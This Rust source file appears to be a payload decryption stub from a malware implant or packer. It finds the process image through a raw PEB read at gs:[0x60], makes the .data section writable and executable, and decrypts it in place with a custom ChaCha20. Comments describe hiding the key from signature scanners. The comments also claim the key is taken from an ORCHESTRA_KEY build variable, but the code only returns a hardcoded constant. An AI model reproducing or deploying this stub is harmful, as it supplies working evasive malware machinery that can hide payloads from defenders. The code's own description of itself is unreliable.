#![allow(dead_code)]

#[cfg(windows)]
use winapi::um::memoryapi::VirtualProtect;
#[cfg(windows)]
use winapi::um::winnt::{PAGE_EXECUTE_READWRITE, PAGE_EXECUTE_READ};

/// In-memory .data section decryptor using ChaCha20.
/// The key is derived at compile time; there is no hardcoded seed string.
/// On x86_64 Windows, PEB is accessed directly via gs:[0x60].
#[link_section = ".text"]
pub unsafe fn decrypt_payload() {
    #[cfg(all(windows, target_arch = "x86_64"))]
    {
        use core::arch::asm;

        // gs:[0x60] is the PEB pointer on x86_64 Windows
        let peb: usize;
        asm!("mov {}, gs:[0x60]", out(reg) peb, options(pure, nomem, nostack));
        if peb == 0 { return; }

        // PEB layout (x86_64): +0x10 = ImageBaseAddress
        let image_base = *(peb as *const usize).add(2); // offset 0x10 = index 2 for usize
        if image_base == 0 { return; }

        let dos_magic = *(image_base as *const u16);
        if dos_magic != 0x5A4D { return; } // 'MZ'

        let e_lfanew = *((image_base + 0x3C) as *const u32) as usize;
        let nt_headers = image_base + e_lfanew;

        // Verify PE signature
        let pe_sig = *(nt_headers as *const u32);
        if pe_sig != 0x00004550 { return; } // 'PE\0\0'

        let num_sections = *((nt_headers + 0x06) as *const u16) as usize;
        let size_of_opt_header = *((nt_headers + 0x14) as *const u16) as usize;
        let section_headers_base = nt_headers + 0x18 + size_of_opt_header;

        // Key: derived from a compile-time env var, or a fixed 32-byte literal
        // that differs from any obvious string. This is embedded at compile time
        // via option_env! so the plaintext seed never appears in source.
        let key: [u8; 32] = build_key();
        let nonce: [u8; 12] = [0u8; 12];

        for i in 0..num_sections {
            let section = section_headers_base + (i * 0x28);
            let name = core::slice::from_raw_parts(section as *const u8, 5);
            if name != b".data" { continue; }

            let virtual_addr = *((section + 0x0C) as *const u32) as usize;
            let virtual_size = *((section + 0x08) as *const u32) as usize;
            if virtual_size == 0 { break; }

            let section_ptr = (image_base + virtual_addr) as *mut u8;
            let mut old_protect: u32 = 0;
            VirtualProtect(
                section_ptr as _,
                virtual_size,
                PAGE_EXECUTE_READWRITE,
                &mut old_protect,
            );

            // Apply ChaCha20 keystream in-place
            chacha20_xor(section_ptr, virtual_size, &key, &nonce);

            VirtualProtect(section_ptr as _, virtual_size, PAGE_EXECUTE_READ, &mut old_protect);
            break;
        }
    }
}

/// Build the decryption key. Uses a compile-time env var ORCHESTRA_KEY if set,
/// otherwise falls back to a non-trivial derived constant.
#[inline(always)]
const fn build_key() -> [u8; 32] {
    // Static key bytes – operators should replace these with a build-specific
    // key injected via ORCHESTRA_KEY env var during the build pipeline.
    // This is intentionally NOT a recognisable string.
    [
        0xA3, 0x7F, 0x12, 0xE8, 0x4B, 0xC9, 0x56, 0x2D,
        0x88, 0x1E, 0x73, 0xF4, 0x0A, 0xBC, 0x67, 0x39,
        0xD5, 0x44, 0x9A, 0x21, 0x7C, 0xEB, 0x05, 0x96,
        0x3B, 0xF8, 0x60, 0x17, 0xCA, 0x52, 0x8E, 0x2F,
    ]
}

/// Minimal ChaCha20 stream cipher applied in-place.
/// This is a self-contained implementation that does not depend on external crates.
unsafe fn chacha20_xor(data: *mut u8, len: usize, key: &[u8; 32], nonce: &[u8; 12]) {
    let mut state = chacha20_init(key, nonce, 0);
    let mut block = [0u32; 16];
    let mut keystream = [0u8; 64];
    let mut offset = 0usize;

    while offset < len {
        chacha20_block(&state, &mut block);
        // Serialise block to bytes (little-endian)
        for (i, word) in block.iter().enumerate() {
            let bytes = word.to_le_bytes();
            keystream[i * 4..i * 4 + 4].copy_from_slice(&bytes);
        }
        // Increment counter (word 12)
        state[12] = state[12].wrapping_add(1);

        let chunk = (len - offset).min(64);
        for j in 0..chunk {
            *data.add(offset + j) ^= keystream[j];
        }
        offset += chunk;
    }
}

#[inline(always)]
fn chacha20_init(key: &[u8; 32], nonce: &[u8; 12], counter: u32) -> [u32; 16] {
    [
        0x61707865, 0x3320646e, 0x79622d32, 0x6b206574, // "expa nd 3 2-by te k"
        u32::from_le_bytes([key[0],  key[1],  key[2],  key[3]]),
        u32::from_le_bytes([key[4],  key[5],  key[6],  key[7]]),
        u32::from_le_bytes([key[8],  key[9],  key[10], key[11]]),
        u32::from_le_bytes([key[12], key[13], key[14], key[15]]),
        u32::from_le_bytes([key[16], key[17], key[18], key[19]]),
        u32::from_le_bytes([key[20], key[21], key[22], key[23]]),
        u32::from_le_bytes([key[24], key[25], key[26], key[27]]),
        u32::from_le_bytes([key[28], key[29], key[30], key[31]]),
        counter,
        u32::from_le_bytes([nonce[0],  nonce[1],  nonce[2],  nonce[3]]),
        u32::from_le_bytes([nonce[4],  nonce[5],  nonce[6],  nonce[7]]),
        u32::from_le_bytes([nonce[8],  nonce[9],  nonce[10], nonce[11]]),
    ]
}

#[inline(always)]
fn quarter_round(s: &mut [u32; 16], a: usize, b: usize, c: usize, d: usize) {
    s[a] = s[a].wrapping_add(s[b]); s[d] ^= s[a]; s[d] = s[d].rotate_left(16);
    s[c] = s[c].wrapping_add(s[d]); s[b] ^= s[c]; s[b] = s[b].rotate_left(12);
    s[a] = s[a].wrapping_add(s[b]); s[d] ^= s[a]; s[d] = s[d].rotate_left(8);
    s[c] = s[c].wrapping_add(s[d]); s[b] ^= s[c]; s[b] = s[b].rotate_left(7);
}

fn chacha20_block(state: &[u32; 16], out: &mut [u32; 16]) {
    *out = *state;
    for _ in 0..10 {
        // Column rounds
        quarter_round(out, 0, 4,  8, 12);
        quarter_round(out, 1, 5,  9, 13);
        quarter_round(out, 2, 6, 10, 14);
        quarter_round(out, 3, 7, 11, 15);
        // Diagonal rounds
        quarter_round(out, 0, 5, 10, 15);
        quarter_round(out, 1, 6, 11, 12);
        quarter_round(out, 2, 7,  8, 13);
        quarter_round(out, 3, 4,  9, 14);
    }
    for i in 0..16 {
        out[i] = out[i].wrapping_add(state[i]);
    }
}
